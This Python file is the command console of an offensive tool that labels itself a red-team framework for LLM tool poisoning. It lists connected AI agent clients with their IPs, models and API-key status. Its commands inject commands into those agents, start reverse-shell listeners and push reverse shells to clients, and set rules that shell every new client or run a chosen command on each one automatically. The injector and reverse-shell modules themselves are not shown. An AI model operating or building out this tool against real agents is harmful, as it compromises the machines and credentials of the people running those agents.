import os
import select
import sys
import state
import injector
import revshell

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich import box

console = Console(highlight=False)

ASCII_BANNER = r"""
        ▄▄▄▄    ██▓     ▒█████   ▒█████  ▓█████▄▓██   ██▓    ▄▄▄       ██▓    ██▓███   ██▀███   ▒█████  ▒██   ██▒▓██   ██▓
       ▓█████▄ ▓██▒    ▒██▒  ██▒▒██▒  ██▒▒██▀ ██▌▒██  ██▒   ▒████▄    ▓██▒   ▓██░  ██▒▓██ ▒ ██▒▒██▒  ██▒▒▒ █ █ ▒░ ▒██  ██▒
       ▒██▒ ▄██▒██░    ▒██░  ██▒▒██░  ██▒░██   █▌ ▒██ ██░   ▒██  ▀█▄  ▒██▒   ▓██░ ██▓▒▓██ ░▄█ ▒▒██░  ██▒░░  █   ░  ▒██ ██░
       ▒██░█▀  ▒██░    ▒██   ██░▒██   ██░░▓█▄   ▌ ░ ▐██▓░   ░██▄▄▄▄██ ░██░   ▒██▄█▓▒ ▒▒██▀▀█▄  ▒██   ██░ ░ █ █ ▒   ░ ▐██▓░
       ░▓█  ▀█▓░██████▒░ ████▓▒░░ ████▓▒░░▒████▓  ░ ██▒▓░    ▓█   ▓██▒░██░   ▒██▒ ░  ░░██▓ ▒██▒░ ████▓▒░▒██▒ ▒██▒  ░ ██▒▓░
       ░▒▓███▀▒░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒▒▓  ▒   ██▒▒▒     ▒▒   ▓▒█░░▓     ▒▓▒░ ░  ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒▒ ░ ░▓ ░   ██▒▒▒
       ▒░▒   ░ ░ ░ ▒  ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ▒  ▒ ▓██ ░▒░      ▒   ▒▒ ░ ▒ ░   ░▒ ░       ░▒ ░ ▒░  ░ ▒ ▒░ ░░   ░▒ ░ ▓██ ░▒░
        ░    ░   ░ ░   ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░  ░ ▒ ▒ ░░       ░   ▒    ▒ ░   ░░         ░░   ░ ░ ░ ░ ▒   ░    ░   ▒ ▒ ░░
        ░          ░  ░    ░ ░      ░ ░     ░    ░ ░              ░  ░ ░                 ░         ░ ░   ░    ░   ░ ░
             ░                            ░      ░ ░                                                              ░ ░
"""

HELP_TEXT = """\
[bold white]list clients[/bold white]           — connected proxy clients
[bold white]list shells[/bold white]            — active reverse shell sessions
[bold white]inject <id>[/bold white]            — open injector for a client
[bold white]shell <id>[/bold white]             — attach to a shell session
[bold white]revshell <id>[/bold white]          — start listener + inject revshell to client (auto port)
[bold white]revshell stop[/bold white]          — kill the listener
[bold white]rule init revshell[/bold white]     — auto-revshell every new client
[bold white]rule init revshell + <cmd>[/bold white]  — revshell + auto-run cmd in every new shell
[bold white]rule init cmd <cmd>[/bold white]    — auto-inject cmd to every new client
[bold white]rule shell <cmd>[/bold white]       — auto-run cmd in every new shell session
[bold white]rule clear[/bold white]             — clear all rules
[bold white]rules[/bold white]                  — show active rules
[bold white]server local[/bold white]           — set proxy to local mode
[bold white]server public[/bold white]          — set proxy to public mode
[bold white]help[/bold white]                   — show this
[bold white]exit[/bold white]                   — quit\
"""


def _clear():
    os.system("cls" if os.name == "nt" else "clear")


_PROMPT = "\x1b[1;31mbproxy>\x1b[0m "


def _wait_input() -> str | None:
    """Block on stdin but wake every 0.5s to detect new notifications.
    Returns None when new notifications arrived (triggers redraw)."""
    sys.stdout.write(_PROMPT)
    sys.stdout.flush()
    while True:
        ready, _, _ = select.select([sys.stdin], [], [], 0.5)
        if ready:
            return sys.stdin.readline().rstrip("\n")
        with state._notifications_lock:
            has_notif = bool(state.notifications)
        if has_notif:
            sys.stdout.write("\n")
            sys.stdout.flush()
            return None  # caller should redraw


def _print_header():
    console.print(f"[bold red]{ASCII_BANNER}[/bold red]")
    console.print(
        "                    "
        "[dim]AI Bloody Proxy — red team framework for LLM tool poisoning[/dim]\n"
    )
    status    = "[green]● ACTIVE[/green]" if state.server_running else "[dim]○ stopped[/dim]"
    n_clients = len(state.clients)
    n_sess    = len(state.sessions)
    if state.listener:
        n_dead = sum(1 for s in state.sessions.values() if not s.alive())
        listener = (
            f"  [dim]│[/dim]  [green]● listener[/green] :{state.listener.port}"
            f"  [dim]sessions:[/dim] {n_sess}"
            + (f" [dim]({n_dead} dead)[/dim]" if n_dead else "")
        )
    else:
        listener = f"  [dim]│[/dim]  [dim]○ no listener[/dim]  [dim]shells:[/dim] {n_sess}"
    # active rules summary
    with state._rules_lock:
        r_init  = state.rule_on_init
        r_shell = state.rule_on_shell
    rule_parts = []
    if r_init == "revshell":
        rule_parts.append("[yellow]● rule:init→revshell[/yellow]")
    elif isinstance(r_init, dict) and r_init.get("cmd"):
        rule_parts.append(f"[yellow]● rule:init→cmd[/yellow] [dim]{r_init['cmd'][:30]!r}[/dim]")
    if r_shell:
        rule_parts.append(f"[yellow]● rule:shell→{r_shell[:30]!r}[/yellow]")
    rules_line = ("  [dim]│[/dim]  " + "  ".join(rule_parts)) if rule_parts else ""

    console.print(Panel(
        f"{status}  "
        f"[dim]proxy[/dim] :{state.proxy_port}  "
        f"[dim]│[/dim]  [dim]clients:[/dim] {n_clients}"
        f"{listener}"
        f"{rules_line}",
        border_style="red", expand=False,
    ))


def _drain_notifications():
    """Pop and show any pending server-side notifications (new clients, etc.)."""
    while True:
        with state._notifications_lock:
            if not state.notifications:
                break
            msg = state.notifications.pop(0)
        console.print(Panel(f"[cyan]{msg}[/cyan]", border_style="cyan", expand=False))


def _print_last(last):
    _drain_notifications()
    if last is None:
        return
    kind, text = last
    if kind == "ok":
        console.print(Panel(f"[green]{text}[/green]", border_style="green", expand=False))
    elif kind == "error":
        console.print(Panel(f"[red]{text}[/red]", border_style="red", expand=False))


def _print_clients():
    with state._clients_lock:
        snapshot = dict(state.clients)
    if not snapshot:
        console.print(Panel("[dim]no clients connected[/dim]", border_style="dim", expand=False))
        return
    t = Table(box=box.SIMPLE, show_header=True, padding=(0, 2))
    t.add_column("Id",      style="bold cyan", no_wrap=True)
    t.add_column("IP",      style="white",     no_wrap=True)
    t.add_column("Agent",   style="white")
    t.add_column("Model",   style="dim")
    t.add_column("Key",     style="dim",       no_wrap=True)
    for cid, info in snapshot.items():
        agent = info.get("agent", "?")
        ver   = info.get("version", "")
        agent_s = f"{agent} v{ver}" if ver else agent
        key_s   = "[green]✓[/green]" if info.get("has_key") else "[red]✗[/red]"
        t.add_row(str(cid), info["ip"], agent_s, info.get("model",""), key_s)
    console.print(Panel(t, title="[cyan]Clients[/cyan]", border_style="cyan", expand=False))


def get_user_cmd():
    last = None

    while True:
        _clear()
        _print_header()
        _print_last(last)

        console.print("[dim]type [white]help[/white] for commands[/dim]\n")

        try:
            user_input = _wait_input()
        except (KeyboardInterrupt, EOFError):
            console.print("\n[dim]exiting...[/dim]")
            break

        if user_input is None:
            last = None
            continue

        user_input = user_input.strip()
        if not user_input:
            last = None
            continue

        cmd = user_input.lower()

        # ── exit ──────────────────────────────────────────────────────────────
        if cmd in ("q", "quit", "exit"):
            console.print("[dim]exiting...[/dim]")
            break

        # ── help ──────────────────────────────────────────────────────────────
        if cmd == "help":
            _clear()
            _print_header()
            console.print(Panel(HELP_TEXT, title="[white]commands[/white]",
                                border_style="dim", expand=False))
            console.input("\n[dim]press enter to continue...[/dim]")
            last = None
            continue

        # ── list ──────────────────────────────────────────────────────────────
        if cmd == "list clients":
            _clear()
            _print_header()
            _print_clients()
            console.input("\n[dim]press enter to continue...[/dim]")
            last = None
            continue

        if cmd == "list shells":
            _clear()
            _print_header()
            revshell.print_sessions()
            console.input("\n[dim]press enter to continue...[/dim]")
            last = None
            continue

        # ── inject ────────────────────────────────────────────────────────────
        if cmd.startswith("inject "):
            cid = user_input[7:].strip()
            if cid not in state.clients:
                last = ("error", f"no client with id {cid!r}")
                continue
            injector.run(cid, state.clients[cid]["ip"])
            last = None
            continue

        # ── shell ─────────────────────────────────────────────────────────────
        if cmd.startswith("shell "):
            sid = user_input[6:].strip()
            with state._sessions_lock:
                exists = sid in state.sessions
            if not exists:
                last = ("error", f"no session {sid!r}")
                continue
            revshell.attach(sid)
            last = None
            continue

        # ── revshell ──────────────────────────────────────────────────────────
        if cmd == "revshell stop":
            msg  = revshell.stop_listener()
            last = ("ok" if "stopped" in msg else "error", msg)
            continue

        if cmd.startswith("revshell "):
            cid = user_input[9:].strip()
            if cid not in state.clients:
                last = ("error", f"no client with id {cid!r}")
                continue
            ok, msg = revshell.start_and_inject(
                client_id=cid,
                gateway=state.clients[cid]["gateway"],
                target_ip=state.clients[cid]["ip"],
            )
            last = ("ok" if ok else "error", msg)
            continue

        # ── rules ─────────────────────────────────────────────────────────────
        if cmd == "rules":
            with state._rules_lock:
                r_i = state.rule_on_init
                r_s = state.rule_on_shell
            lines = []
            if r_i is None and r_s is None:
                lines.append("[dim]no active rules[/dim]")
            else:
                if r_i == "revshell":
                    lines.append("[yellow]init rule:[/yellow] revshell → every new client gets a shell")
                elif isinstance(r_i, dict) and r_i.get("cmd"):
                    lines.append(f"[yellow]init rule:[/yellow] cmd → {r_i['cmd']!r}")
                if r_s:
                    lines.append(f"[yellow]shell rule:[/yellow] auto-run {r_s!r} in every new session")
            last = ("ok", "\n".join(lines))
            continue

        if cmd == "rule clear":
            with state._rules_lock:
                state.rule_on_init  = None
                state.rule_on_shell = None
            last = ("ok", "[*] all rules cleared")
            continue

        if cmd == "rule clear init":
            with state._rules_lock:
                state.rule_on_init = None
            last = ("ok", "[*] init rule cleared")
            continue

        if cmd == "rule clear shell":
            with state._rules_lock:
                state.rule_on_shell = None
            last = ("ok", "[*] shell rule cleared")
            continue

        if cmd == "rule init revshell":
            with state._rules_lock:
                state.rule_on_init = "revshell"
            last = ("ok", "[*] init rule set: revshell → every new client will get a shell")
            continue

        if cmd.startswith("rule init revshell + "):
            post_cmd = user_input[len("rule init revshell + "):].strip()
            if not post_cmd:
                last = ("error", "usage: rule init revshell + <command>")
                continue
            with state._rules_lock:
                state.rule_on_init  = "revshell"
                state.rule_on_shell = post_cmd
            last = ("ok",
                f"[*] init rule set: revshell\n"
                f"[*] shell rule set: auto-run {post_cmd!r} in every new session")
            continue

        if cmd.startswith("rule init cmd "):
            inject_cmd = user_input[len("rule init cmd "):].strip()
            if not inject_cmd:
                last = ("error", "usage: rule init cmd <command>")
                continue
            with state._rules_lock:
                state.rule_on_init = {"cmd": inject_cmd}
            last = ("ok", f"[*] init rule set: inject {inject_cmd!r} to every new client")
            continue

        if cmd.startswith("rule shell "):
            shell_cmd = user_input[len("rule shell "):].strip()
            if not shell_cmd:
                last = ("error", "usage: rule shell <command>")
                continue
            with state._rules_lock:
                state.rule_on_shell = shell_cmd
            last = ("ok", f"[*] shell rule set: auto-run {shell_cmd!r} in every new session")
            continue

        # ── server ────────────────────────────────────────────────────────────
        if cmd == "server local":
            state.public_proxy = False
            last = ("ok", "Successfully set server to local mode")
            continue

        if cmd == "server public":
            state.public_proxy = True
            last = ("ok", "Successfully set server to public mode")
            continue

        last = ("error", f"unknown command: {user_input!r}  (type help)")
